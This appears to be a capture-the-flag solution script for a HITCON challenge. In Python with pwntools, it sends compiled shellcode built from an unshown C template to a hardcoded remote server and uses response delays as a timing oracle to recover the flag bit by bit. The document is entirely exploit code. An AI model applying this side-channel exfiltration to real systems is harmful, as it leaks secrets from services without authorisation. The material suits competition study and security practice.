#!/usr/bin/python
import cshc
from pwn import *
import socket
import time

THRESHOLD = 0.05

def _try(expr):
    r = remote("52.68.16.142", 10003 ,silent = True)
    tmpl = open("exploit.c").read()
    code = tmpl.replace("__EXPR__", expr)
    buf = cshc.arch("x86_64").compile(code)
    r.send(buf + "\0" * (8192 - len(buf)))
    t = time.time()
    b = r.recvuntil("Wow, It's beautiful!")
    delay = time.time() - t
    r.close()
    return delay >= THRESHOLD

flag = "hitcon{"
while True:
    byte = 0
    mask = 0x01
    while mask != 0x80:
        print len(flag), hex(mask)
        if _try("buf[%d] & %d" % (len(flag), mask)):
            byte |= mask
        mask <<= 1
    flag += chr(byte)
    print flag
